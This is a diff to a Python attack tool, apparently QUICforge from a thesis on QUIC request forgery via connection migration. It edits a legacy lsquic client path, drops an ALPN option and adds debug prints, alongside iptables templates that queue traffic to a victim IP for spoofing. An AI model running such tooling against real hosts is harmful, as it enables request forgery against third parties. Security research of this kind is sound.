@@ -47,8 +47,8 @@ SPOOFED_COUNT = 0
 # Iptables Templates
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
 
-# Legacy Lsquic support
-lsquic_client_tmpl = "/home/master/quic/yuri-repos/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/master/quic/masterthesis/experiments/keylog -p {path} -K -o scid_len=20"
+# Legacy Lsquic support, adjust to the correct install path
+lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K -o scid_len=20"
 lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
 lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
 
@@ -77,7 +77,6 @@ def parse_arguments():
     parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
     parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
     parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
-    parser_cm.add_argument('--alpn','-a', help='(legacy only) The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='')
     parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
     parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
 
@@ -223,7 +222,9 @@ def main():
         print("[+] Starting client")
         processes = []
         if args.legacy:
+            print("[!] legacy mode")
             cmd = configure_legacy_client(args)
+            print(cmd)
             p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             processes.append(p)
         else:
